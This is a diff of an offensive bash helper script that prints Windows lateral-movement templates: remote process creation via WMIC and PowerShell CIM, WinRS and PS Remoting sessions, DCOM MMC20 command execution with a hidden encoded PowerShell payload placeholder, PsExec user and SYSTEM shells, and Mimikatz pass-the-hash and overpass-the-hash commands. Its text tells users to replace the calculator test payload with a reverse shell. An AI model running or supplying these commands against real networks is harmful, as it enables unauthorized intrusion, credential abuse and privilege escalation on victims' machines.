@@ -65,9 +65,11 @@ case $method in
     cat <<EOF
 $line
 
-[!] Tip: There are 2 methods for RCE using WMI: WMIC & Powershell. WMIC is deprecated, but it may still be enabled for backwards compatibility
+[Background]
 
-These test payloads just launch the Calculator App. If they work, it'll output the PID & ReturnValue 0.
+There are 2 methods for RCE using WMI: WMIC & Powershell. WMIC is deprecated, but it may still be enabled for backwards compatibility
+
+These test payloads just launch the Calculator App. If they work, it'll output the PID & ReturnValue 0
 
 After the test, substitute the calc command for a Reverse shell payload (e.g. \$Command = 'powershell -nop -w hidden -e...)
 
@@ -75,46 +77,50 @@ $line
 
 [WMIC PoC]
 
-	wmic /node:$target /user:$user /password:$passwd process call create "calc"
+wmic /node:$target /user:$user /password:$passwd process call create "calc"
+
+$line
 
 [Powershell PoC]
 
-	\$username = '$user';
-	\$password = '$passwd';
-	\$secureString = ConvertTo-SecureString \$password -AsPlaintext -Force;
-	\$credential = New-Object System.Management.Automation.PSCredential \$username, \$secureString;
-	\$Options = New-CimSessionOption -Protocol DCOM
-	\$Session = New-Cimsession -ComputerName $target -Credential \$credential -SessionOption \$Options
-	\$Command = 'calc';
-	Invoke-CimMethod -CimSession \$Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =\$Command};
+\$username = '$user';
+\$password = '$passwd';
+\$secureString = ConvertTo-SecureString \$password -AsPlaintext -Force;
+\$credential = New-Object System.Management.Automation.PSCredential \$username, \$secureString;
+\$Options = New-CimSessionOption -Protocol DCOM
+\$Session = New-Cimsession -ComputerName $target -Credential \$credential -SessionOption \$Options
+\$Command = 'calc';
+Invoke-CimMethod -CimSession \$Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =\$Command};
 
 $line
 EOF
     ;;
   winrm|2)
-    echo -e "Specify the target's Hostname for WinRS or its IP Address for PS Remoting:"
+    echo -e "Specify the target's Hostname for WinRS or its IP Address for PS Remoting\n"
     read target
     Creds
 
-	cat <<EOF
+    cat <<EOF
 $line
 
 [WinRS PoC]
 
 If this test works, substitute the commands for a Reverse shell payload
 
-	winrs -r:$target -u:$user -p:$passwd "cmd /c hostname & whoami"
+winrs -r:$target -u:$user -p:$passwd "cmd /c hostname & whoami"
+
+$line
 
 [PS Remoting]
 
-[!] Tip: Based off of output from New-PSSession, you may need to use a differnt ID number for Enter-PSSession
+Based off of output from New-PSSession, you may need to use a differnt ID number for Enter-PSSession
 
-	\$username = '$user';
-	\$password = '$passwd';
-	\$secureString = ConvertTo-SecureString \$password -AsPlaintext -Force;
-	\$credential = New-Object System.Management.Automation.PSCredential \$username, \$secureString;
-	New-PSSession -ComputerName $target -Credential \$credential
-	Enter-PSSession 1
+\$username = '$user';
+\$password = '$passwd';
+\$secureString = ConvertTo-SecureString \$password -AsPlaintext -Force;
+\$credential = New-Object System.Management.Automation.PSCredential \$username, \$secureString;
+New-PSSession -ComputerName $target -Credential \$credential
+Enter-PSSession 1
 
 $line
 EOF
@@ -126,12 +132,18 @@ EOF
     cat <<EOF
 $line
 
+[Setup]
+
 This DCOM method requires that your CURRENT user is a Local Admin on the current machine & the target machine
 
 You must run the following commands inside an Admin Powershell terminal (i.e. R Click & Run as Admin)
 
-	\$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","$target"))
-	\$dcom.Document.ActiveView.ExecuteShellCommand("powershell",\$null,"powershell -nop -w hidden -e ENCODED_PAYLOAD","7")
+$line
+
+[DCOM]
+
+\$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","$target"))
+\$dcom.Document.ActiveView.ExecuteShellCommand("powershell",\$null,"powershell -nop -w hidden -e ENCODED_PAYLOAD","7")
 
 $line
 EOF
@@ -140,6 +152,8 @@ EOF
 #output cmds for Mimikatz & Rubeus for PtH & PtT
     cat <<EOF
 $line
+
+[Setup]
 
 PSExec can be uploaded to the target & doesn't need to be installed.
 
@@ -161,10 +175,16 @@ EOF
 $line
 
 [User shell]
-	.\\PsExec.exe -accepteula -i \\\\$target -u $dom\\$user -p $passwd powershell
+
+.\\PsExec.exe -accepteula -i \\\\$target -u $dom\\$user -p $passwd powershell
+
+$line
 
 [SYSTEM shell]
-	.\\PsExec.exe -accepteula -s \\\\$target -u $dom\\$user -p $passwd powershell
+
+.\\PsExec.exe -accepteula -s \\\\$target -u $dom\\$user -p $passwd powershell
+
+$line
 EOF
 
   elif [[ "$opt" == 2 ]]; then
@@ -182,24 +202,33 @@ EOF
 $line
 
 [Setup]
-	1) Launch an Admin Powershell terminal & start Mimikatz
-	2) privilege::debug
+
+1) Launch an Admin Powershell terminal & start Mimikatz
+
+2) privilege::debug
+
+$line
 
 [PtH]
-	sekurlsa::pth /user:$user /domain:$dom /ntlm:$ntlm /run:powershell
+
+sekurlsa::pth /user:$user /domain:$dom /ntlm:$ntlm /run:powershell
+
+$line
 
 [OPtH]
 
 Request a TGT using the new Powershell session (e.g. authenticate to an SMB Share)
 
-	net use \\\\$target
-	klist
+net use \\\\$target
+klist
 
 [User shell]
-	.\\PsExec.exe -accepteula \\\\$target powershell
+
+.\\PsExec.exe -accepteula \\\\$target powershell
 
 [SYSTEM shell]
-	.\\PsExec.exe -accepteula -s \\\\$target powershell
+
+.\\PsExec.exe -accepteula -s \\\\$target powershell
 
 $line
 EOF
